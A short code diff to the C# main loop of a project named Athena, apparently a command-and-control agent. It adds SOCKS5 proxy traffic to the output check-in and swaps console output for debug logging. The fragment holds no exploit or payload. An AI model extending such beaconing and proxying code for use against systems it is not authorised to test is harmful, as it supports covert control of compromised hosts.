@@ -110,14 +110,13 @@ namespace Athena
                         }
                     }
                     //Return output if server is accessible
-                    if (hasoutput.Count > 0 || Globals.bagOut.Count > 0)
+                    if (hasoutput.Count > 0 || Globals.socksHandler.Count() > 0)
                     {
                         //Did the POST send properly?
                         //Should I return the object and handle all the parsing shit out here?
                         if (Globals.mc.SendResponse(hasoutput))
                         {
-                            //Clear out delegates array
-                            //Globals.delegateMessages.Clear();
+
                             //Remove sent commands from the Global job Dictionary or clear out taskresult of long running tasks
                             foreach (var job in hasoutput.Values)
                             {
@@ -140,7 +139,9 @@ namespace Athena
                         }
                         else
                         {
-                            Console.WriteLine("False");
+                            //How worried are we about interrupted messages for SOCKS5?
+
+                            Misc.WriteDebug("False");
                         }
                     }
                     //Get sleep and go
